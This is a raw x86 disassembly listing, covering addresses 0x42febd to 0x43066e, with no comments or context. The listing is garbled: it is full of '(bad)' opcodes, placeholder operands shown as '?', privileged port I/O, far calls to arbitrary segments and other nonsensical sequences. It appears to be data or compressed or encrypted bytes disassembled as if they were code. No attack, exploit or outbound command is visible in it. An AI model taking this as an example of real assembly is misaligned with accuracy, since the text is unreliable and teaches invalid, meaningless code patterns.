  42febd:	add    DWORD PTR [edi+ecx*1],eax
  42fec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fec1:	pop    es
  42fec2:	imul   esi,DWORD PTR [eax-0x5f4ae982],0x77
  42fec9:	xchg   ebx,eax
  42feca:	mov    es,WORD PTR [esi-0x77a7ec91]
  42fed0:	(bad)  
  42fed1:	push   esp
  42fed2:	inc    edx
  42fed3:	sub    cl,ah
  42fed5:	pop    eax
  42fed6:	les    edx,FWORD PTR [eax-0x71]
  42fed9:	xchg   esi,eax
  42feda:	in     al,0x85
  42fedc:	sub    al,BYTE PTR [edx+0x50]
  42fedf:	aam    0xdc
  42fee1:	mov    ah,0xd8
  42fee3:	fbld   TBYTE PTR [edx-0xff817b5]
  42fee9:	outs   dx,BYTE PTR ds:[esi]
  42feea:	jno    0x42ff5e
  42feec:	and    eax,0xb524c0c2
  42fef1:	mov    cs,edx
  42fef3:	push   es
  42fef4:	mov    ?,esp
  42fef6:	dec    edx
  42fef7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fef8:	inc    ecx
  42fef9:	je     0x42febe
  42fefb:	dec    ecx
  42fefc:	out    0x9a,al
  42fefe:	aam    0xb5
  42ff00:	inc    edi
  42ff01:	sbb    DWORD PTR [edi-0x13966c70],ebx
  42ff07:	push   esi
  42ff08:	and    bl,BYTE PTR ds:0xb6826803
  42ff0e:	pop    esi
  42ff0f:	mov    ebx,ebp
  42ff11:	sub    BYTE PTR [esi-0x6defa10a],bh
  42ff17:	lods   al,BYTE PTR ds:[esi]
  42ff18:	inc    eax
  42ff19:	adc    ch,BYTE PTR [edx]
  42ff1b:	mov    edx,0x5034d089
  42ff20:	mov    al,ds:0x58ccc6a8
  42ff25:	cmp    al,0x42
  42ff27:	sub    DWORD PTR [eax],ecx
  42ff29:	and    esp,DWORD PTR [eax]
  42ff2b:	jbe    0x42ff4d
  42ff2d:	fs add eax,0x4e5426b0
  42ff33:	pop    eax
  42ff34:	jp     0x42ff06
  42ff36:	add    al,0x1c
  42ff38:	not    dh
  42ff3a:	ins    BYTE PTR es:[edi],dx
  42ff3b:	sub    ch,BYTE PTR [eax+0x46]
  42ff3e:	popa   
  42ff3f:	fadd   st,st(7)
  42ff41:	sub    BYTE PTR [edx],dh
  42ff43:	jns    0x42fec5
  42ff45:	rol    BYTE PTR [ecx],1
  42ff47:	imul   ebp,DWORD PTR [edi],0xffffffa5
  42ff4a:	sti    
  42ff4b:	sub    al,0xf7
  42ff4d:	imul   esi
  42ff4f:	sub    BYTE PTR [edx],ah
  42ff51:	(bad)  
  42ff52:	or     BYTE PTR ds:0x40f46883,dh
  42ff58:	(bad)  
  42ff59:	arpl   WORD PTR [ebx+edx*1-0x66],sp
  42ff5d:	push   eax
  42ff5e:	dec    eax
  42ff5f:	sub    BYTE PTR [eax+0x6047c088],bl
  42ff65:	inc    ebp
  42ff66:	mov    edx,0xeceaa458
  42ff6b:	jmp    0xa20a:0xe2621db4
  42ff72:	data16 test al,0xa2
  42ff75:	sbb    ah,BYTE PTR [ebx-0x25f297fd]
  42ff7b:	icebp  
  42ff7c:	pop    esi
  42ff7d:	cmp    al,0x20
  42ff7f:	xchg   BYTE PTR [ecx+0x3c447b04],ah
  42ff85:	pop    es
  42ff86:	(bad)  
  42ff87:	hlt    
  42ff88:	cmp    BYTE PTR [edx+0x47],cl
  42ff8b:	shl    BYTE PTR [edx],1
  42ff8d:	into   
  42ff8e:	push   esp
  42ff8f:	mov    eax,eax
  42ff91:	and    BYTE PTR [eax],ch
  42ff93:	jo     0x42ff16
  42ff95:	xor    BYTE PTR [edx+edi*4+0xfc71bde],bl
  42ff9c:	and    al,0xac
  42ff9e:	push   ss
  42ff9f:	jbe    0x42ff2c
  42ffa1:	cmp    dl,BYTE PTR [eax]
  42ffa3:	xor    DWORD PTR [eax],eax
  42ffa5:	pop    esp
  42ffa6:	cmp    al,0xf8
  42ffa8:	add    BYTE PTR [eax+0x41],ah
  42ffab:	in     eax,0xde
  42ffad:	jmp    0x42ff41
  42ffaf:	enter  0xa124,0x4f
  42ffb3:	push   eax
  42ffb4:	(bad)  [ecx-0x7543939c]
  42ffba:	xor    al,0x77
  42ffbc:	fisubr DWORD PTR [ecx]
  42ffbe:	or     al,0x96
  42ffc0:	sub    eax,0x3c8206b0
  42ffc5:	jns    0x42ffd9
  42ffc7:	push   0x6
  42ffc9:	add    al,0x5b
  42ffcb:	mov    eax,ds:0x3b46ee34
  42ffd0:	icebp  
  42ffd1:	fs inc eax
  42ffd3:	sub    BYTE PTR [edx-0x4b],bl
  42ffd6:	sahf   
  42ffd7:	sbb    BYTE PTR [eax],ch
  42ffd9:	test   edx,edi
  42ffdb:	and    al,0xfc
  42ffdd:	nop
  42ffde:	call   0x504d:0xde47314
  42ffe5:	xor    al,0x6f
  42ffe7:	scas   eax,DWORD PTR es:[edi]
  42ffe8:	xor    al,0xc0
  42ffea:	inc    ebp
  42ffeb:	dec    esp
  42ffec:	xchg   ebx,eax
  42ffed:	add    BYTE PTR [eax+0x5f],ch
  42fff0:	pop    ebp
  42fff1:	call   0x235a:0xed4b0974
  42fff8:	imul   esp
  42fffa:	shr    BYTE PTR [ecx],0xaa
  42fffd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fffe:	sbb    ebp,DWORD PTR [edx+edi*2-0x6f]
  430002:	add    BYTE PTR [esi+eiz*4-0x5e],ah
  430006:	pusha  
  430007:	mov    edx,0x41b6b3a5
  43000c:	fs xchg edi,eax
  43000e:	mov    es,WORD PTR [eax+0x9fa7de]
  430014:	fld    TBYTE PTR ss:[edx-0x7]
  430018:	je     0x42ff9c
  43001a:	adc    BYTE PTR [edi+0x3c],ah
  43001d:	push   0xfffffffa
  43001f:	fs pop ebx
  430021:	mov    bl,0x1d
  430023:	sbb    BYTE PTR [edi],ah
  430025:	fisub  DWORD PTR [edx]
  430027:	call   0xf42e:0xa766ee5e
  43002e:	aam    0x26
  430030:	fmul   DWORD PTR [eax+0x162ac347]
  430036:	shl    BYTE PTR [eax-0x60],0xd
  43003a:	inc    ebp
  43003b:	mov    ebx,0xb6e1388a
  430040:	adc    ch,BYTE PTR [esi+0x64e01626]
  430046:	aam    0xf6
  430048:	add    eax,esp
  43004a:	add    BYTE PTR [eax+0x40528449],bh
  430050:	cmp    al,0x66
  430052:	ds dec eax
  430054:	mov    ah,0x5f
  430056:	xchg   esp,eax
  430057:	call   0x2f55:0x2cdb3412
  43005e:	adc    BYTE PTR [ebp+0x6096d210],bl
  430064:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430065:	lods   eax,DWORD PTR ds:[esi]
  430066:	mov    ds:0x46c6cdd9,eax
  43006b:	idiv   BYTE PTR cs:[edx-0x19ae35c6]
  430072:	adc    bl,BYTE PTR [edx]
  430074:	or     cl,BYTE PTR [esi]
  430076:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430077:	jne    0x4300a9
  430079:	pop    edi
  43007a:	sbb    ah,BYTE PTR [esi-0x1554bfb2]
  430080:	js     0x4300bb
  430082:	ror    cl,0xb8
  430085:	xor    cl,BYTE PTR [edi+ebp*4]
  430088:	popa   
  430089:	lods   al,BYTE PTR ds:[esi]
  43008a:	or     bl,BYTE PTR es:[eax-0x3598ef22]
  430091:	pusha  
  430092:	xchg   esp,eax
  430093:	pusha  
  430094:	sbb    eax,0x3adc5518
  430099:	jmp    0x4300b5
  43009b:	push   0xffffff92
  43009d:	cmp    BYTE PTR [eax-0x14],bh
  4300a0:	pop    ebx
  4300a1:	stos   BYTE PTR es:[edi],al
  4300a2:	mov    ds:0xe5f8a9a3,eax
  4300a7:	inc    esi
  4300a8:	ins    DWORD PTR es:[edi],dx
  4300a9:	push   es
  4300aa:	rcl    BYTE PTR [eax+edi*1+0x73],1
  4300ae:	mov    ch,0xad
  4300b0:	mov    eax,ds:0x7ec9b00
  4300b5:	call   0x76597c69
  4300ba:	sub    al,0xf4
  4300bc:	ins    WORD PTR es:[edi],dx
  4300be:	inc    ecx
  4300bf:	inc    ecx
  4300c0:	loopne 0x4300d4
  4300c2:	mov    ss,WORD PTR [ebp+edi*1-0x1f]
  4300c6:	push   0xffffffbe
  4300c8:	pop    eax
  4300c9:	add    al,0xb4
  4300cb:	loop   0x4300e6
  4300cd:	shl    BYTE PTR [ecx],0xb9
  4300d0:	fcmovbe st,st(1)
  4300d2:	mov    ?,eax
  4300d4:	mov    ebx,0x7451a434
  4300da:	sbb    bh,dh
  4300dc:	sub    dl,BYTE PTR [ecx]
  4300de:	pop    ebp
  4300df:	push   cs
  4300e0:	add    DWORD PTR [edx-0x44],0x62
  4300e4:	bnd jbe 0x4300fd
  4300e7:	cmp    DWORD PTR [esi+0x7c],edx
  4300ea:	in     al,dx
  4300eb:	outs   dx,DWORD PTR ds:[esi]
  4300ec:	jbe    0x4300ac
  4300ee:	or     DWORD PTR [edx+0x5632e420],0x9e06fb43
  4300f8:	hlt    
  4300f9:	jl     0x430111
  4300fb:	or     al,0xda
  4300fe:	rol    BYTE PTR [eax],1
  430100:	(bad)  
  430102:	aas    
  430103:	pop    edi
  430104:	jnp    0x430138
  430106:	xchg   esi,eax
  430107:	adc    eax,0x87b2e8aa
  43010c:	push   ss
  43010d:	sub    al,0xc2
  43010f:	dec    esp
  430110:	and    BYTE PTR [ecx+0xa],ah
  430113:	lahf   
  430114:	das    
  430115:	lods   eax,DWORD PTR ds:[esi]
  430116:	adc    ch,BYTE PTR [eax+edx*2]
  430119:	test   BYTE PTR [esi+0x6],bl
  43011c:	in     al,0x24
  43011e:	jnp    0x43015e
  430120:	mov    BYTE PTR [esi-0x8bbfcfa],0x38
  430127:	dec    edx
  430128:	lods   al,BYTE PTR ds:[esi]
  430129:	adc    dl,BYTE PTR [eax-0xb]
  43012c:	pop    eax
  43012d:	es and eax,0x10e0063d
  430133:	lods   eax,DWORD PTR ds:[esi]
  430134:	ins    DWORD PTR es:[edi],dx
  430135:	jp     0x43014f
  430137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430138:	lods   al,BYTE PTR ds:[esi]
  430139:	ret    
  43013a:	jp     0x43014a
  43013c:	popf   
  43013d:	inc    eax
  43013e:	fs add al,0xb6
  430141:	or     BYTE PTR [edi-0x4a],0x2a
  430145:	pop    edx
  430146:	nop
  430147:	call   0x6d90ce01
  43014c:	push   ebx
  43014d:	mov    ebx,0x4dac26ca
  430152:	xor    al,0xef
  430154:	jo     0x43017e
  430156:	mov    edi,0x3d7f1004
  43015b:	sbb    DWORD PTR [eax+0x40],ebp
  43015e:	jb     0x4301b8
  430160:	idiv   BYTE PTR [edx+0x36]
  430163:	add    BYTE PTR [ebx+0x4b5350c4],dh
  430169:	call   0xa478bc6
  43016e:	sub    ecx,DWORD PTR [esp+esi*1-0x74]
  430172:	cli    
  430173:	mov    DWORD PTR [ebp+0x64],0x7847b5bc
  43017a:	outs   dx,BYTE PTR ds:[esi]
  43017b:	xor    al,0x9a
  43017d:	out    dx,al
  43017e:	push   esp
  43017f:	adc    eax,DWORD PTR [eax]
  430181:	das    
  430182:	test   al,0x41
  430184:	mov    ah,0x43
  430186:	adc    BYTE PTR [esi],bl
  430188:	and    DWORD PTR [ebp-0x2959bb6e],edi
  43018e:	mov    al,ds:0x7c3a5350
  430193:	jle    0x430147
  430195:	bnd ja 0x430162
  430198:	push   es
  430199:	icebp  
  43019a:	xchg   ebx,eax
  43019b:	mov    al,0xb
  43019e:	ds retf 0x3a
  4301a2:	in     al,dx
  4301a3:	mov    dl,0xb5
  4301a5:	xor    dh,dl
  4301a7:	push   edx
  4301a8:	sahf   
  4301a9:	pop    es
  4301aa:	mov    eax,edi
  4301ac:	jbe    0x4301c8
  4301ae:	add    al,0x76
  4301b0:	jo     0x430197
  4301b2:	add    BYTE PTR [eax+0x6c6c726a],al
  4301b8:	xchg   edi,eax
  4301b9:	shr    BYTE PTR [esi+edx*1+0x3c1c6684],1
  4301c0:	xchg   ebp,eax
  4301c1:	sub    al,ch
  4301c3:	mov    BYTE PTR [edx+0x62],bh
  4301c6:	xor    al,0x44
  4301c8:	jbe    0x4301bb
  4301ca:	add    dl,cl
  4301cc:	or     eax,0x5ad246c0
  4301d1:	push   0x60f1146a
  4301d6:	nop
  4301d7:	cld    
  4301d8:	pop    esi
  4301d9:	pop    edi
  4301da:	or     ch,BYTE PTR [edx-0x4f376376]
  4301e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4301e1:	xchg   esi,eax
  4301e2:	scas   al,BYTE PTR es:[edi]
  4301e3:	adc    ch,bh
  4301e5:	rol    DWORD PTR [edx],cl
  4301e7:	xor    ebp,DWORD PTR [edx]
  4301e9:	jo     0x430221
  4301eb:	or     al,0xcc
  4301ed:	loop   0x4301ba
  4301ef:	push   0x5
  4301f1:	pop    ss
  4301f2:	ret    0x6426
  4301f5:	outs   dx,BYTE PTR ds:[esi]
  4301f6:	xchg   esp,eax
  4301f7:	push   cs
  4301f8:	shl    ah,cl
  4301fa:	cdq    
  4301fb:	icebp  
  4301fc:	and    DWORD PTR [ebx+ebx*1+0x56],esi
  430200:	cmp    eax,0x8b9a1c46
  430205:	cmp    bl,BYTE PTR [edx]
  430207:	cmp    BYTE PTR [edx-0x82bcfd0],0x0
  43020e:	int    0xc5
  430210:	test   cl,dh
  430212:	rcr    dl,0x5e
  430215:	outs   dx,BYTE PTR ds:[esi]
  430216:	pushf  
  430217:	mov    esi,0x50a85c4d
  43021c:	sar    al,0x46
  43021f:	rcr    esp,cl
  430221:	push   0xffffffda
  430223:	adc    BYTE PTR ds:0x39c4a85b,0x38
  43022a:	popf   
  43022b:	out    dx,al
  43022c:	mov    fs,WORD PTR [esi-0x6f]
  43022f:	call   0x8acd:0x967c7ad4
  430236:	push   ebp
  430237:	ins    BYTE PTR es:[edi],dx
  430238:	push   0x0
  43023a:	sbb    al,0x82
  43023c:	inc    ebx
  43023d:	and    dl,BYTE PTR [edx+0x49]
  430240:	sbb    cl,BYTE PTR [edx+eax*2-0x93bad7b]
  430247:	xor    al,0xf8
  430249:	rcr    al,0x61
  43024c:	frstor [esi]
  43024e:	sbb    al,0x13
  430250:	call   0xf6a2:0x1dc9901e
  430257:	dec    eax
  430258:	mov    bh,BYTE PTR [ebx+0x1]
  43025b:	lods   al,BYTE PTR ds:[esi]
  43025c:	or     DWORD PTR [edx+0x1568c972],edx
  430262:	adc    bx,WORD PTR [eax]
  430265:	call   0xe8c2:0x1441583f
  43026c:	test   al,0xf4
  43026e:	in     al,dx
  43026f:	ficomp WORD PTR [esi-0x7cae3cea]
  430275:	add    BYTE PTR [ebx+0x6d],bh
  430278:	or     esp,DWORD PTR [ecx+0x1c]
  43027b:	into   
  43027c:	mov    ds:0x889144f8,al
  430281:	inc    esp
  430282:	push   eax
  430283:	mov    ?,WORD PTR [esp+edx*1-0x7e]
  430287:	or     edx,DWORD PTR [ecx]
  430289:	xchg   ebp,eax
  43028a:	inc    esp
  43028b:	mov    cl,0x5e
  43028d:	sbb    ch,BYTE PTR [esi-0x5675db88]
  430293:	dec    esi
  430294:	sbb    cl,ch
  430296:	or     al,0xd6
  430298:	xchg   BYTE PTR [edi],ah
  43029a:	mov    ds:0x144e59,eax
  43029f:	xor    al,0xaa
  4302a1:	(bad)  
  4302a2:	push   ds
  4302a3:	push   es
  4302a4:	rcr    bl,cl
  4302a6:	iret   
  4302a7:	add    BYTE PTR [esi-0x41f3ad56],dh
  4302ad:	and    ecx,esp
  4302af:	add    esp,eax
  4302b1:	mov    al,0xb5
  4302b3:	jmp    0x2c40:0xb61d0dce
  4302ba:	mov    bh,BYTE PTR [esi+0xe]
  4302bd:	call   0xb2a8:0xb75c97de
  4302c4:	sbb    eax,0x2a19c415
  4302c9:	sub    al,0x43
  4302cb:	or     ah,ah
  4302cd:	outs   dx,BYTE PTR ds:[esi]
  4302ce:	adc    al,0xae
  4302d0:	dec    ebp
  4302d1:	sub    al,0xd2
  4302d3:	arpl   WORD PTR [esp+edx*1+0x20940082],si
  4302da:	or     al,0x62
  4302dc:	shr    BYTE PTR [eax+0x4a],0x58
  4302e0:	imul   esi,DWORD PTR [esi-0x11],0x64
  4302e4:	and    eax,0xf7884e5e
  4302e9:	or     edx,ebp
  4302eb:	sbb    BYTE PTR [ebx+0x30b778cc],0x73
  4302f2:	fmul   DWORD PTR [ebx+0x1c]
  4302f5:	dec    eax
  4302f6:	daa    
  4302f7:	cli    
  4302f8:	sub    ah,BYTE PTR [esi+0x10]
  4302fb:	pop    ds
  4302fc:	sub    DWORD PTR [ebx+ebx*4-0x3e],edx
  430300:	pop    eax
  430301:	in     al,0xea
  430303:	or     BYTE PTR [edx+0x1a64a122],al
  430309:	pop    esi
  43030a:	adc    al,0x84
  43030c:	mov    ds:0xc41f8493,al
  430311:	(bad)  
  430312:	das    
  430313:	push   esp
  430314:	cmp    al,0xb4
  430316:	cwde   
  430317:	test   DWORD PTR [ecx+0x50],edx
  43031a:	(bad)  
  43031b:	iret   
  43031c:	pushf  
  43031d:	xchg   edx,eax
  43031e:	mov    eax,0x50e6ab0a
  430323:	inc    ecx
  430324:	mov    esp,0x6a3cee66
  430329:	cs scas al,BYTE PTR es:[edi]
  43032b:	add    eax,0x40150006
  430330:	dec    esi
  430331:	into   
  430332:	push   ds
  430333:	xor    al,bh
  430335:	add    DWORD PTR [eax+esi*4-0x23],ebp
  430339:	(bad)  
  43033a:	in     al,dx
  43033b:	xor    eax,0x47d3c206
  430340:	mov    al,ds:0xccc01da0
  430345:	inc    ebx
  430346:	and    bl,BYTE PTR [eax+ebx*8+0x2ab55472]
  43034d:	mov    al,ds:0x1ac2c1ea
  430352:	sbb    al,0xa5
  430354:	mov    dh,BYTE PTR [esi+0x5469bfd4]
  43035a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43035b:	ror    dl,1
  43035d:	xchg   ebp,eax
  43035e:	ins    DWORD PTR es:[edi],dx
  43035f:	add    BYTE PTR [ebp+eax*1+0x63],cl
  430363:	ror    DWORD PTR ds:0xd40023e2,1
  430369:	push   esi
  43036a:	push   0x103c16a4
  43036f:	clc    
  430370:	mov    dh,0x89
  430372:	(bad)  
  430373:	lock lods al,BYTE PTR ds:[esi]
  430375:	mov    BYTE PTR [ebp*4+0x1ad0d609],0xce
  43037d:	mov    cs,WORD PTR [esp+eax*1-0xe]
  430381:	dec    eax
  430382:	loop   0x4303f4
  430384:	lods   al,BYTE PTR ds:[esi]
  430385:	pop    ebp
  430386:	inc    edx
  430387:	push   0x120d8b2c
  43038c:	jle    0x430336
  43038e:	adc    eax,0x7c0e9358
  430393:	pop    eax
  430394:	jmp    0xb135:0xd4bdd6d6
  43039b:	mov    al,ds:0x3d0c85a4
  4303a0:	xchg   edx,eax
  4303a1:	(bad)  
  4303a2:	data16 mov fs,WORD PTR [esi+0x20]
  4303a6:	in     al,0x70
  4303a8:	jp     0x4303fc
  4303aa:	adc    DWORD PTR [esi-0x55753da6],0x30
  4303b1:	pushf  
  4303b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4303b3:	fs adc eax,0x159a2a7f
  4303b9:	jmp    0x430353
  4303bb:	push   edx
  4303bc:	push   esp
  4303bd:	stos   BYTE PTR es:[edi],al
  4303be:	inc    esi
  4303bf:	fdivr  st(7),st
  4303c1:	jo     0x430438
  4303c3:	pop    ecx
  4303c4:	ret    0xa066
  4303c7:	retf   0x385e
  4303ca:	add    DWORD PTR [ebp+0x5],edx
  4303cd:	sub    ch,0xba
  4303d0:	fidiv  DWORD PTR [ebx+eax*1]
  4303d3:	push   esi
  4303d4:	mov    dh,al
  4303d6:	imul   ebp,DWORD PTR [eax+0x102842b],0x5
  4303dd:	or     al,0xb1
  4303df:	mov    esp,0xc569279e
  4303e4:	adc    DWORD PTR [eax+0x3d8dca05],edi
  4303ea:	call   0xa599b93c
  4303ef:	call   0x8f89fca8
  4303f4:	jl     0x430422
  4303f6:	xchg   esi,eax
  4303f7:	pop    ecx
  4303f8:	aad    0xf4
  4303fa:	xchg   edx,eax
  4303fb:	inc    edi
  4303fc:	push   ss
  4303fd:	xlat   BYTE PTR ds:[ebx]
  4303fe:	adc    bh,BYTE PTR [ebp-0x2f2972a7]
  430404:	push   esp
  430405:	cs (bad) 
  430407:	sti    
  430408:	outs   dx,BYTE PTR ds:[esi]
  430409:	imul   esp,DWORD PTR [edx],0xea6d9ee
  43040f:	add    eax,0xb8cbea7a
  430414:	retf   0x2e26
  430417:	and    al,0xb4
  430419:	dec    eax
  43041a:	and    DWORD PTR [edx],esp
  43041c:	fimul  DWORD PTR [ebx-0x36]
  43041f:	aas    
  430420:	or     eax,0x1a3438ac
  430425:	push   edx
  430426:	stc    
  430427:	fcomp  DWORD PTR [edx*1-0x25ef8dd5]
  43042e:	popa   
  43042f:	loop   0x4303eb
  430431:	push   ss
  430432:	or     BYTE PTR [esi-0x6],0x48
  430436:	mov    al,ds:0x76be18a9
  43043b:	call   0x40bd7fa7
  430440:	ins    BYTE PTR es:[edi],dx
  430441:	setle  BYTE PTR [esi+edi*4]
  430445:	rcr    BYTE PTR [esi+0x78],0x94
  430449:	mov    ecx,0x90c691a3
  43044e:	jb     0x43047e
  430450:	dec    esp
  430451:	int    0x6c
  430453:	rol    BYTE PTR ds:0x9dbe32b0,0xe6
  43045a:	adc    eax,0x62a7892f
  43045f:	ins    BYTE PTR es:[edi],dx
  430460:	push   esi
  430461:	mov    al,ds:0xa2cc0003
  430466:	arpl   WORD PTR [ebx+0x1a],si
  430469:	inc    ebp
  43046a:	jp     0x430457
  43046c:	sbb    BYTE PTR [esi-0x70ba6d46],cl
  430472:	jp     0x4304d9
  430474:	scas   al,BYTE PTR es:[edi]
  430475:	stos   DWORD PTR es:[edi],eax
  430476:	daa    
  430477:	or     al,0x91
  430479:	je     0x4304e3
  43047b:	xchg   BYTE PTR [eax],cl
  43047d:	add    eax,0xd2fb9e0d
  430482:	or     ah,BYTE PTR [esi-0x5f]
  430485:	bound  eax,QWORD PTR [ecx+0x54425891]
  43048b:	je     0x430503
  43048d:	mov    ebp,0xd78905c
  430492:	pop    edx
  430493:	xchg   ebx,eax
  430494:	pushf  
  430495:	xor    BYTE PTR [ebp+0x15a3a30e],dh
  43049b:	cmp    al,0x87
  43049d:	fs pop edx
  43049f:	fisubr WORD PTR [esi+0x8]
  4304a2:	xor    al,0x3
  4304a4:	jo     0x4304a7
  4304a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4304a7:	(bad)  
  4304a9:	dec    esp
  4304aa:	sbb    edi,DWORD PTR [esi]
  4304ac:	inc    esp
  4304ad:	not    bl
  4304af:	outs   dx,BYTE PTR ds:[esi]
  4304b0:	dec    esi
  4304b1:	repnz sbb al,0xb6
  4304b4:	sub    al,BYTE PTR es:[eax-0xb31c37e]
  4304bb:	retf   
  4304bc:	mov    cs,WORD PTR [esi-0x6d]
  4304bf:	mov    es,WORD PTR ds:0xda888047
  4304c5:	cld    
  4304c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4304c7:	xlat   BYTE PTR ds:[ebx]
  4304c8:	push   es
  4304c9:	imul   ebx,DWORD PTR [edi+0x77341580],0xffffffb7
  4304d0:	push   ds
  4304d1:	inc    ebx
  4304d2:	int    0x58
  4304d4:	sub    DWORD PTR [edx+eiz*1+0x160aa2d1],edx
  4304db:	jno    0x430527
  4304dd:	pop    ss
  4304de:	pop    es
  4304df:	ds push eax
  4304e1:	test   DWORD PTR [esi+ecx*8],esi
  4304e4:	aam    0x20
  4304e6:	pop    edi
  4304e7:	inc    eax
  4304e8:	loopne 0x430539
  4304ea:	xchg   esp,eax
  4304eb:	push   edx
  4304ec:	mov    ah,0x8a
  4304ee:	shl    edx,0x17
  4304f1:	les    ebp,FWORD PTR ds:0x1045ec9a
  4304f7:	add    al,0xd8
  4304f9:	shr    ah,1
  4304fb:	into   
  4304fc:	jbe    0x4304ce
  4304fe:	lds    eax,FWORD PTR [edi]
  430500:	aam    0x27
  430502:	sbb    BYTE PTR [esi-0x52],al
  430505:	mov    ds:0x466ccaa4,al
  43050a:	or     DWORD PTR [ebp+0x1a],eax
  43050d:	imul   ecx,edx,0xffffffbe
  430510:	in     al,0xe1
  430512:	mov    ah,0x57
  430514:	shr    BYTE PTR [ebx],cl
  430516:	and    bl,dh
  430518:	ret    
  430519:	push   esp
  43051a:	sbb    bh,BYTE PTR [ecx-0x48]
  43051d:	stc    
  43051e:	add    DWORD PTR [edx],ecx
  430520:	mov    cs,WORD PTR [eax]
  430522:	test   BYTE PTR [edi],0xcc
  430525:	test   eax,0x2a42e37c
  43052a:	xor    al,BYTE PTR [eax-0x18597520]
  430530:	mov    ds:0x7609c3b5,eax
  430535:	pop    edx
  430536:	sbb    eax,0x13f3afe
  43053b:	pusha  
  43053c:	xlat   BYTE PTR ds:[ebx]
  43053d:	mov    ch,0x7a
  43053f:	mov    WORD PTR [eax],ds
  430541:	test   ch,0x65
  430544:	cmp    al,0x0
  430546:	ds inc ecx
  430548:	loopne 0x430577
  43054a:	int3   
  43054b:	sub    al,0x57
  43054d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43054e:	mov    ch,0x50
  430550:	jo     0x430597
  430552:	add    BYTE PTR [edx+0x36],al
  430555:	stos   BYTE PTR es:[edi],al
  430556:	cwde   
  430557:	push   0x3b
  430559:	adc    al,0x36
  43055b:	mov    al,ds:0xd51a05c5
  430560:	mov    es,WORD PTR [esi-0x2e]
  430563:	adc    eax,0x4a5a1015
  430568:	data16 loopne 0x4305bb
  43056b:	jns    0x430515
  43056d:	push   esi
  43056e:	adc    al,0xbc
  430570:	or     al,bh
  430572:	test   al,0x0
  430574:	jge    0x43054e
  430576:	fcmove st,st(2)
  430578:	lock scas al,BYTE PTR es:[edi]
  43057a:	xor    BYTE PTR [ecx+0x68421006],al
  430580:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  430582:	js     0x4305ac
  430584:	loopne 0x430509
  430586:	aam    0xdb
  430588:	in     al,dx
  430589:	nop
  43058a:	pop    ebp
  43058b:	xchg   BYTE PTR [eax],dh
  43058d:	cmp    bh,BYTE PTR [esi]
  43058f:	add    ebp,DWORD PTR [eax+0x42]
  430592:	jge    0x430536
  430594:	mov    al,ds:0x474d881e
  430599:	clc    
  43059a:	mov    al,0x46
  43059c:	jno    0x43052f
  43059e:	adc    al,0xbb
  4305a0:	rcl    DWORD PTR [eax-0x5c],1
  4305a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4305a4:	pushf  
  4305a5:	xchg   BYTE PTR [ebp+0x3618cf02],bh
  4305ab:	xchg   ebx,eax
  4305ac:	aad    0x60
  4305ae:	xchg   ecx,eax
  4305af:	fdiv   QWORD PTR es:[edi-0x5f5f5b65]
  4305b6:	pop    ebp
  4305b7:	inc    esp
  4305b8:	adc    al,0xe4
  4305ba:	add    al,bl
  4305bc:	mov    esi,0x149b06d8
  4305c1:	mov    ah,0x45
  4305c3:	outs   dx,BYTE PTR ds:[esi]
  4305c4:	cmp    BYTE PTR [esi],0x43
  4305c7:	jmp    0x5b1d:0x987267f4
  4305ce:	scas   eax,DWORD PTR es:[edi]
  4305cf:	sub    al,0x50
  4305d1:	lea    edi,[eax+ebp*1]
  4305d4:	mov    ch,0x8c
  4305d6:	adc    DWORD PTR cs:[esi+0x762675a6],esi
  4305dd:	outs   dx,BYTE PTR ds:[esi]
  4305de:	(bad)  
  4305df:	sbb    DWORD PTR [ebx-0x39af5c60],edi
  4305e5:	mov    WORD PTR [ebx+0x1b],ds
  4305e8:	fbld   TBYTE PTR [esi+ebx*1]
  4305eb:	mov    ss,ebx
  4305ed:	or     al,0x9e
  4305ef:	icebp  
  4305f0:	push   0xffffffa8
  4305f2:	mov    al,0x62
  4305f4:	neg    BYTE PTR [ecx]
  4305f6:	or     bh,dl
  4305f8:	fadd   QWORD PTR [eax-0x652925e3]
  4305fe:	rcr    BYTE PTR [esi+esi*2-0x41df9b36],cl
  430605:	push   ebx
  430606:	pop    eax
  430607:	and    bh,0x9a
  43060a:	imul   ebp,DWORD PTR [ebx-0x2a],0x34
  43060e:	repz loop 0x4305cf
  430611:	les    ebp,FWORD PTR [esi]
  430613:	push   ebp
  430614:	bound  ecx,QWORD PTR [eax]
  430616:	add    BYTE PTR [ecx+ebx*4-0x28],0xa
  43061b:	sbb    bh,BYTE PTR [eax]
  43061d:	push   0x54
  43061f:	sbb    bh,BYTE PTR [edx]
  430621:	push   cs
  430622:	push   ecx
  430623:	xlat   BYTE PTR ds:[ebx]
  430624:	adc    al,0x16
  430626:	sbb    al,0x24
  430628:	sub    edi,esp
  43062a:	xchg   ebx,eax
  43062b:	cli    
  43062c:	mov    dl,0xd9
  43062e:	imul   BYTE PTR [ebp+eax*2+0x215c20d]
  430635:	pop    ss
  430636:	push   esp
  430637:	and    BYTE PTR [eax+eiz*4-0x3b67165f],bl
  43063e:	or     ch,cl
  430640:	into   
  430641:	jno    0x43064d
  430643:	jae    0x430697
  430645:	fsub   DWORD PTR [ebp-0x5cf4974f]
  43064b:	jo     0x430666
  43064d:	fdiv   QWORD PTR [eax]
  43064f:	xchg   DWORD PTR [esi+0x5b],eax
  430652:	and    al,0xf2
  430654:	jp     0x4305d8
  430656:	jg     0x4305e0
  430658:	mov    WORD PTR [eax+0x159603],gs
  43065e:	xchg   BYTE PTR [eax],ch
  430660:	out    0xe6,al
  430662:	aad    0x4
  430664:	mov    ch,0xd4
  430666:	xor    ah,al
  430668:	out    dx,al
  430669:	add    al,0x58
  43066b:	dec    eax
  43066c:	and    BYTE PTR [eax],ch
  43066e:	add    al,0xda
